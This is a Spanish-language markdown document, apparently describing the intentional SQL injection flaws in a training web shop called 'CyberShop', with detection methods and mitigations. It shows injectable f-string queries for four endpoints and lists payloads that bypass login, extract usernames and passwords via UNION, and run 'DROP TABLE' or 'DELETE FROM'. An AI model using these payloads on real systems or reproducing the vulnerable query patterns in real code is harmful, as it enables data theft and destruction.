# Vulnerabilidades de Inyección en CyberShop

## Descripción General
Las vulnerabilidades de inyección en CyberShop permiten a los atacantes insertar código malicioso en diferentes partes de la aplicación. Estas vulnerabilidades están presentes principalmente en forma de inyecciones SQL, pero también incluyen otros tipos de inyecciones.

## Ubicaciones Vulnerables

### 1. Búsqueda de Productos
```sql
-- Endpoint: /api/products/search
-- Código vulnerable:
query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"
```
#### Ejemplo de Explotación
```sql
-- Búsqueda maliciosa:
search_term = "' OR '1'='1"
-- Resultado:
"SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'"
```

### 2. Filtrado de Productos por Categoría
```sql
-- Endpoint: /api/products/category
-- Código vulnerable:
query = f"SELECT * FROM products WHERE category_id = {category_id}"
```
#### Ejemplo de Explotación
```sql
-- ID de categoría malicioso:
category_id = "1 OR 1=1; --"
```

### 3. Sistema de Reseñas
```sql
-- Endpoint: /api/reviews/add
-- Código vulnerable:
query = f"INSERT INTO reviews (product_id, user_id, comment) VALUES ({product_id}, {user_id}, '{comment}')"
```
#### Ejemplo de Explotación
```sql
-- Comentario malicioso:
comment = "'); DELETE FROM products; --"
```

### 4. Panel de Administración
```sql
-- Endpoint: /api/admin/users/search
-- Código vulnerable:
query = f"SELECT * FROM users WHERE username LIKE '%{search_term}%'"
```

## Impacto Potencial
- Acceso no autorizado a datos
- Modificación de registros en la base de datos
- Eliminación de datos
- Bypass de autenticación
- Escalada de privilegios

## Métodos de Detección

### 1. Pruebas Manuales
- Insertar caracteres especiales (`'`, `"`, `;`, `--`)
- Probar operadores lógicos (`OR`, `AND`)
- Intentar concatenar consultas
- Usar comentarios SQL (`--`, `#`, `/**/`)

### 2. Herramientas Automatizadas
- SQLMap
- Burp Suite
- OWASP ZAP

## Ejemplos de Payloads

### SQL Injection Básica
```sql
' OR '1'='1
' OR 1=1; --
admin' --
' UNION SELECT null, username, password FROM users --
```

### Inyecciones Avanzadas
```sql
'; WAITFOR DELAY '0:0:5' --
'; DROP TABLE users; --
' UNION SELECT table_name, null FROM information_schema.tables --
```

## Mitigación
1. Usar consultas parametrizadas
2. Implementar ORM
3. Validar y sanitizar entradas
4. Implementar WAF
5. Principio de mínimo privilegio
6. Escapar caracteres especiales

## Recursos Adicionales
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
